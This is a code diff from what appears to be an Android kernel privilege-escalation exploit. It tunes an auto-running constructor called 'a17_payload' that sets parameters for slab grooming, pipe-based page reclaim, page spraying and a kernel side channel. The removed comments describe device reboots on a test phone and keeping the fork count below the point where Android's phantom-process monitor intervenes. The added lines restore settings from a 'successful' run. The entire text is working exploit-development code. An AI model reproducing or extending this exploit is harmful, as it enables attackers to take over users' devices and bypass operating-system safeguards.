@@ -76,30 +76,9 @@ __attribute__((constructor)) static void a17_payload(void) {
     _exit(1);
   }
   setenv("GL_WQ_UMH", "1", 1);
-  /* A missed rwforge owner scan may still leave the round's reclaimed page
-   * with modified struct-page state.  Keep each carrier alive across retry
-   * rounds so prepare_kernel_page() cannot release it before the channel is
-   * available to repair the tracked pages. */
-  setenv("GL_DEFER_CLOSE", "1", 1);
-  /* Android's phantom-process monitor counts native fork children and may
-   * kill the app cgroup when the default 200/400-child drain runs.  Keep the
-   * concurrent fanout below its usual 32-process ceiling while retaining
-   * repeated mm_struct slab churn. */
-  setenv("GL_SLAB_DRAIN_BATCH", "24", 1);
-  setenv("GL_SLAB_DRAIN_WAVES", "8", 1);
-  /* The initial pipe reclaim otherwise retains 800 mm-backed proc mem fds
-   * before KernelSnitch runs.  CZG1 has rebooted inside that preparation;
-   * halve its retained slab pressure while keeping ample grooming depth. */
-  setenv("GL_PIPE_PREP_SLABS", "16", 1);
-  /* A connected miss leaves deliberately retained carrier pages behind.
-   * Re-reclaiming inside the same process reuses that dirty state and has
-   * rebooted CZG1 at the second outer prime.  Return cleanly after one outer;
-   * a later app run starts with a fresh process and descriptor set. */
-  setenv("GL_RWF_OUTERS", "1", 1);
-  /* A connected route whose owner/land check misses is the last safe point
-   * on CZG1: another prepare_kernel_page() has repeatedly rebooted the
-   * device.  Fail this app run instead of touching a second spray page. */
-  setenv("GL_ABORT_CONNECTED_MISS", "1", 1);
+  /* Match the environment used by the successful CZG1 rr_loop run. */
+  setenv("GL_RWF_SLOTS", "64", 1);
+  setenv("RWF_DEBUG", "1", 1);
 
   pid_t chain = fork();
   if (chain < 0) {
